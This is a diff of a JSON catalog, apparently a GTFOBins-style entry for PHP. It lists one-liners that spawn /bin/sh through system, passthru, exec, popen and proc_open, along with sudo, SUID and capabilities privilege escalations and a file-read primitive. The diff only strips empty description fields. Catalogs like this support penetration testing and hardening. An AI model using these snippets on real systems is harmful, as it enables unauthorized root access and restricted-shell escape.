@@ -2,29 +2,29 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'\n"
       },
       {
-        "description": "",
+        
         "code": "export CMD=\"/bin/sh\"\nphp -r 'passthru(getenv(\"CMD\"));'\n"
       },
       {
-        "description": "",
+        
         "code": "export CMD=\"/bin/sh\"\nphp -r 'print(shell_exec(getenv(\"CMD\")));'\n"
       },
       {
-        "description": "",
+        
         "code": "export CMD=\"/bin/sh\"\nphp -r '$r=array(); exec(getenv(\"CMD\"), $r); print(join(\"\\\\n\",$r));'\n"
       },
       {
-        "description": "",
+        
         "code": "export CMD=\"/bin/sh\"\nphp -r '$h=@popen(getenv(\"CMD\"),\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'\n"
       }
     ],
     "command": [
       {
-        "description": "",
+        
         "code": "export CMD=\"id\"\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(getenv(\"CMD\"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'\n"
       }
     ],
@@ -48,25 +48,25 @@
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
       }
     ],
     "capabilities": [
       {
-        "description": "",
+        
         "code": "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
       }
     ],
     "file-read": [
       {
-        "description": "",
+        
         "code": "export LFILE=file_to_read\nphp -r 'readfile(getenv(\"LFILE\"));'\n"
       }
     ],
